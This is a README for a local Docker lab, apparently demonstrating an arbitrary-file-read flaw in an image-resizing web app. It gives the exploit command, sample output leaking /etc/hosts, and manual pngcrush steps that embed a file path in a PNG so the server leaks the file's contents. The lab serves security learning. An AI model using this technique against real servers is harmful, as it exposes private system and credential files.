## Container exploit playground

WIP

### Prerequisites on local machine:
* [Docker Desktop](https://docs.docker.com/get-docker/) (or similar)
* [pngcrush](https://pmt.sourceforge.io/pngcrush/)
* [Python 3](https://www.python.org/)
* [curl](https://github.com/curl/curl)
* _Optional but helpful for troubleshooting:_ [exiv2](https://exiv2.org/) 

### Steps to run (build from the vulnerable-app folder):
* Build the image: `docker build -t poc .`
* Run the vulnerable app: `docker run --rm -p 3000:5000 poc`
* Trigger the exploit, passing in whatever file you want to cat from the poc: `./exploit.py /etc/hosts`

#### Example output:
```shell
$ ./exploit.py /etc/hosts
Encoding /etc/hosts into k8s.png as pngout.png...
Sending pngout.png to localhost:3000...
Finding processed image and downloading as result.png...
Downloading resized-image-1676317559895.png as result.png
Decoding content from /Users/foo/path/to/result.png...

127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::0	ip6-localnet
ff00::0	ip6-mcastprefix
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
172.17.0.2	2b6cb0891610
```

Manual Steps:
1. Build and run the vulnerable app as above
2. Encode the file you want to cat into the image: `pngcrush -text a "profile" "/etc/hosts" pngin.png pngout.png`
3. Upload the file to the webapp at http://localhost:3000/
4. Open the images page at http://localhost:3000/images
5. Download the reduced size copy of the image
6. Decode the image file via `docker run --rm -it -v resized-image.png:/result.png node identify -verbose /result.png`